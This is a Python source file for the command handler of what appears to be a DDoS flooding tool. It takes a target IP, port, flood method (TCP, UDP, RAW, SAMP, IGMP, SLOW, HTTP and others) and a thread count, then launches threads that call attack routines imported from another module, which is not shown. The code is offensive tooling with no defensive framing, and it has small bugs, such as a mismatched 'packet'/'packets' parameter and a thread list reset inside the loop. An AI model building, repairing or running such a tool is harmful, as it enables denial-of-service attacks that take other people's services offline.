# Importing necessary libraries
import os
from os import system as _sys 
import sys
import threading
import time
from time import sleep as wait
import json
from src.func.handler.attackEvent import *

# Configuration variable
default_command = ['attack', 'exit', 'clear']

with open('config/config.json') as f:
    cfg = json.load(f)
    APP_NAME = cfg['AppName']
    DEV = cfg['Developer']
    METHOD_LIST = cfg['attack']['method_list']
    IS_REQUIRED_TO_LOGIN = cfg['login']['isRequiredToLogin']

# Creating a class to handle all the commands
class cmdHandler():
    def loadThreads(ip, port, method, packet, threads):
        if method not in METHOD_LIST:
            print('Invalid method used: {}'.format(method))
            return
        print('Attack sended!')
        for i in range(threads):
            threads = []
            if method == "TCP":
                target = threading.Thread(target=attackHandler.Method._TCP, args=[ip, port, packets])
                threads.append(target)
            if method == "UDP":
                target = threading.Thread(target=attackHandler.Method._UDP, args=[ip, port, packets])
                threads.append(target)
            if method == "RAW":
                target = threading.Thread(target=attackHandler.Method._RAW, args=[ip, port, packets])
                threads.append(target)
            if method == "SAMP":
                target = threading.Thread(target=attackHandler.Method._SAMP, args=[ip, port, packets])
                threads.append(target)
            if method == "IGMP":
                target = threading.Thread(target=attackHandler.Method._IGMP, args=[ip, port, packets])
                threads.append(target)
            if method == "SLOW":
                target = threading.Thread(target=attackHandler.Method._SLOW, args=[ip, port, packets])
                threads.append(target)
            if method == "STD":
                target = threading.Thread(target=attackHandler.Method._STD, args=[ip, port, packets])
                threads.append(target)
            if method == "CC":
                target = threading.Thread(target=attackHandler.Method._CC, args=[ip, port, packets])
                threads.append(target)
            if method == "HTTP":
                target = threading.Thread(target=attackHandler.Method._HTTP, args=[ip, port, packets])
                threads.append(target)
        for target in threads:
            target.start()
        for target in threads:
            target.join()
    # Defining a function to display graphical interface
    def graphics(file_output):
        file = open(file_output, 'r', encoding='utf-8')
        content = file.read()
        print(content)
        file.close()
    # Define a function to read file
    def readFileContent(file_name):
        file = open(file_name, 'r', encoding='utf8')
        content = file.read()
        return content
    # Define a function to get a list of commands
    def getCmdList(command):
        for eachfile in os.listdir('src/assets/cmd/'):
            if eachfile.lower().endswith(('.txt')) == False:
                continue
            else:
                if command == eachfile.replace('.txt', ''):
                    with open('src/assets/cmd/'+eachfile, 'r', encoding='utf8') as cmd:
                        content = cmd.read()
                        print(content)
    # Define a function to get commands
    def parseCmd(command):
        cmdHandler.getCmdList(command)
        if command == 'exit':
            print('Leaving {} in 5 seconds...'.format(APP_NAME))
            wait(5)
            exit()
        if command == 'clear':
            _sys('cls')
            cmdHandler.graphics('src/assets/interface/graphic.txt')
        if command == 'attack':
            try:
                ip, port, method, packets, threads = input('input > ').split()
                if ip == None or port == None or packets == None or threads == None:
                    print('Please input a valid information.')
                else:
                    print('Sending attack to {}:{} using {}'.format(ip, port, method))
                    wait(3)
                    cmdHandler.loadThreads(str(ip), int(port), str(method), int(packets), int(threads))
            except ValueError:
                print('Not enough value.')
